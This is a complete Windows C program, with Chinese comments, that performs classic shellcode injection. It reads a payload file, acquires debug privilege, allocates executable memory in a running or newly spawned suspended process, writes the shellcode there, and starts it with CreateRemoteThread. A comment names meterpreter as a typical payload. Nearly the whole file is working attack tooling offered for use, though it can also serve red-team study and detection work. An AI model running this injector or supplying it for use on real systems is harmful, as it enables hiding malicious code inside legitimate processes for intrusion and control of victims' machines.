/**
 * ===================================================================
 * Classic Shellcode Injection
 * ===================================================================
 *
 * 经典的 Shellcode 注入技术，是最基础的 shellcode 注入方法。
 *
 * 与 DLL Injection 的区别：
 * - DLL Injection: 注入 DLL 路径，调用 LoadLibrary
 * - Shellcode Injection: 直接注入机器码，CreateRemoteThread 执行
 *
 * 核心流程：
 * 1. VirtualAllocEx 分配 RWX 内存
 * 2. WriteProcessMemory 写入 shellcode
 * 3. CreateRemoteThread 执行 shellcode
 *
 * MITRE ATT&CK: T1055.001 - Process Injection
 *
 * 参考：
 * - https://github.com/plackyhacker/Shellcode-Injection-Techniques
 */

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#define INJECTION_TIMEOUT 10000  // 10 秒超时

/**
 * ===================================================================
 * 读取 Shellcode 文件
 * ===================================================================
 */
BOOL ReadShellcodeFile(const char* filename, BYTE** shellcode, DWORD* size) {
    FILE* file = fopen(filename, "rb");
    if (!file) {
        printf("[-] 无法打开文件: %s\n", filename);
        return FALSE;
    }

    // 获取文件大小
    fseek(file, 0, SEEK_END);
    *size = ftell(file);
    fseek(file, 0, SEEK_SET);

    // 分配内存
    *shellcode = (BYTE*)malloc(*size);
    if (!*shellcode) {
        printf("[-] 内存分配失败\n");
        fclose(file);
        return FALSE;
    }

    // 读取文件
    size_t bytesRead = fread(*shellcode, 1, *size, file);
    fclose(file);

    if (bytesRead != *size) {
        printf("[-] 文件读取失败\n");
        free(*shellcode);
        return FALSE;
    }

    return TRUE;
}

/**
 * ===================================================================
 * 打开目标进程
 * ===================================================================
 */
HANDLE OpenTargetProcess(DWORD pid) {
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_READ | PROCESS_VM_WRITE |
        PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION,
        FALSE,
        pid
    );

    if (!hProcess || hProcess == INVALID_HANDLE_VALUE) {
        DWORD err = GetLastError();
        if (err == ERROR_INVALID_PARAMETER) {
            printf("[-] 无法打开进程 [PID: %lu]，进程可能已不存在\n", pid);
        } else {
            printf("[-] 打开进程失败 [PID: %lu]，错误码: 0x%lX\n", pid, err);
        }
        return NULL;
    }

    return hProcess;
}

/**
 * ===================================================================
 * 检查架构兼容性
 * ===================================================================
 */
BOOL IsCompatible(HANDLE hProcess) {
    BOOL isTargetWow64 = FALSE;
    IsWow64Process(hProcess, &isTargetWow64);

    BOOL isInjectorWow64 = FALSE;
    IsWow64Process(GetCurrentProcess(), &isInjectorWow64);

    if (isTargetWow64 != isInjectorWow64) {
        printf("[-] 架构不兼容: 目标进程=%s, 注入器=%s\n",
               isTargetWow64 ? "32位" : "64位",
               isInjectorWow64 ? "32位" : "64位");
        return FALSE;
    }

    return TRUE;
}

/**
 * ===================================================================
 * Classic Shellcode Injection
 * ===================================================================
 */
BOOL InjectShellcode(HANDLE hProcess, BYTE* shellcode, DWORD shellcodeSize) {
    printf("[*] Shellcode 大小: %lu bytes\n", shellcodeSize);

    // 步骤 1: 分配远程内存（RWX 权限）
    printf("\n[*] 步骤 1: 在目标进程分配内存...\n");
    LPVOID pRemoteAddr = VirtualAllocEx(
        hProcess,
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE  // RWX 权限，可直接执行
    );

    if (!pRemoteAddr) {
        printf("[-] VirtualAllocEx 失败，错误码: %lu\n", GetLastError());
        return FALSE;
    }

    printf("[+] VirtualAllocEx() 成功，地址: 0x%p\n", pRemoteAddr);

    // 步骤 2: 写入 shellcode
    printf("\n[*] 步骤 2: 写入 shellcode...\n");
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, pRemoteAddr, shellcode, shellcodeSize, &bytesWritten)) {
        printf("[-] WriteProcessMemory 失败，错误码: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteAddr, 0, MEM_RELEASE);
        return FALSE;
    }

    printf("[+] WriteProcessMemory() 成功，写入: %zu bytes\n", bytesWritten);

    // 步骤 3: 创建远程线程执行 shellcode
    printf("\n[*] 步骤 3: 创建远程线程执行 shellcode...\n");
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pRemoteAddr,  // 入口点 = shellcode 地址
        NULL,  // 无参数
        0,
        NULL
    );

    if (!hThread) {
        printf("[-] CreateRemoteThread 失败，错误码: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteAddr, 0, MEM_RELEASE);
        return FALSE;
    }

    printf("[+] CreateRemoteThread() 成功，线程句柄: 0x%p\n", hThread);
    printf("[*] 等待 shellcode 执行...\n");

    // 等待线程完成
    DWORD waitResult = WaitForSingleObject(hThread, INJECTION_TIMEOUT);

    BOOL success = FALSE;
    if (waitResult == WAIT_OBJECT_0) {
        DWORD exitCode;
        if (GetExitCodeThread(hThread, &exitCode)) {
            printf("[+] Shellcode 执行完成，退出码: 0x%lX\n", exitCode);
            success = TRUE;
        }
    } else if (waitResult == WAIT_TIMEOUT) {
        printf("[*] Shellcode 可能仍在执行（超时）\n");
        success = TRUE;  // 对于长时间运行的 shellcode（如 meterpreter），超时是正常的
    } else {
        printf("[-] 等待失败，错误码: %lu\n", GetLastError());
    }

    CloseHandle(hThread);
    return success;
}

/**
 * ===================================================================
 * 提升进程权限（Debug Privilege）
 * ===================================================================
 */
BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        return FALSE;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}

/**
 * ===================================================================
 * 注入到现有进程
 * ===================================================================
 */
BOOL InjectIntoExistingProcess(DWORD pid, const char* shellcodeFile) {
    printf("\n===================================================================\n");
    printf("Classic Shellcode Injection - 注入到现有进程\n");
    printf("===================================================================\n\n");

    printf("[*] 目标 PID: %lu\n", pid);
    printf("[*] Shellcode 文件: %s\n", shellcodeFile);

    // 读取 shellcode
    BYTE* shellcode = NULL;
    DWORD shellcodeSize = 0;

    if (!ReadShellcodeFile(shellcodeFile, &shellcode, &shellcodeSize)) {
        return FALSE;
    }

    printf("[+] Shellcode 已加载: %lu bytes\n", shellcodeSize);

    // 打开进程
    HANDLE hProcess = OpenTargetProcess(pid);
    if (!hProcess) {
        free(shellcode);
        return FALSE;
    }

    printf("[+] 进程已打开\n");

    // 检查架构兼容性
    if (!IsCompatible(hProcess)) {
        CloseHandle(hProcess);
        free(shellcode);
        return FALSE;
    }

    printf("[+] 架构兼容\n");

    // 注入 shellcode
    BOOL result = InjectShellcode(hProcess, shellcode, shellcodeSize);

    // 清理
    CloseHandle(hProcess);
    free(shellcode);

    return result;
}

/**
 * ===================================================================
 * 注入到新进程
 * ===================================================================
 */
BOOL InjectIntoNewProcess(const char* exePath, const char* shellcodeFile) {
    printf("\n===================================================================\n");
    printf("Classic Shellcode Injection - 注入到新进程\n");
    printf("===================================================================\n\n");

    printf("[*] 目标程序: %s\n", exePath);
    printf("[*] Shellcode 文件: %s\n", shellcodeFile);

    // 读取 shellcode
    BYTE* shellcode = NULL;
    DWORD shellcodeSize = 0;

    if (!ReadShellcodeFile(shellcodeFile, &shellcode, &shellcodeSize)) {
        return FALSE;
    }

    printf("[+] Shellcode 已加载: %lu bytes\n", shellcodeSize);

    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};

    // 创建挂起的进程
    if (!CreateProcessA(
        exePath,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        printf("[-] 创建进程失败，错误码: %lu\n", GetLastError());
        free(shellcode);
        return FALSE;
    }

    printf("[+] 进程已创建 (PID: %lu)\n", pi.dwProcessId);

    // 注入 shellcode
    BOOL result = InjectShellcode(pi.hProcess, shellcode, shellcodeSize);

    // 恢复进程
    printf("\n[*] 恢复主线程...\n");
    ResumeThread(pi.hThread);
    printf("[+] 主线程已恢复\n");

    // 清理
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    free(shellcode);

    return result;
}

/**
 * ===================================================================
 * 主函数
 * ===================================================================
 */
int main(int argc, char* argv[]) {
    printf("===================================================================\n");
    printf("Classic Shellcode Injection\n");
    printf("Based on: plackyhacker/Shellcode-Injection-Techniques\n");
    printf("===================================================================\n\n");

    if (argc < 3) {
        printf("用法:\n");
        printf("  注入到现有进程: %s <PID> <shellcode.bin>\n", argv[0]);
        printf("  注入到新进程:   %s <EXE路径> <shellcode.bin>\n\n", argv[0]);
        printf("示例:\n");
        printf("  %s 1234 shellcode.bin\n", argv[0]);
        printf("  %s \"C:\\\\Windows\\\\System32\\\\notepad.exe\" shellcode.bin\n", argv[0]);
        return 1;
    }

    // 提升权限
    if (EnableDebugPrivilege()) {
        printf("[+] Debug 权限已获取\n\n");
    } else {
        printf("[!] 无法获取 Debug 权限，可能需要管理员权限\n\n");
    }

    const char* target = argv[1];
    const char* shellcodeFile = argv[2];

    // 判断是 PID 还是 EXE 路径
    DWORD pid = atoi(target);
    BOOL result;

    if (pid > 0) {
        // 注入到现有进程
        result = InjectIntoExistingProcess(pid, shellcodeFile);
    } else {
        // 注入到新进程
        result = InjectIntoNewProcess(target, shellcodeFile);
    }

    printf("\n===================================================================\n");
    if (result) {
        printf("[+] Shellcode Injection 完成！\n");
    } else {
        printf("[-] Shellcode Injection 失败！\n");
    }
    printf("===================================================================\n");

    printf("\n按回车键退出...\n");
    getchar();

    return result ? 0 : 1;
}
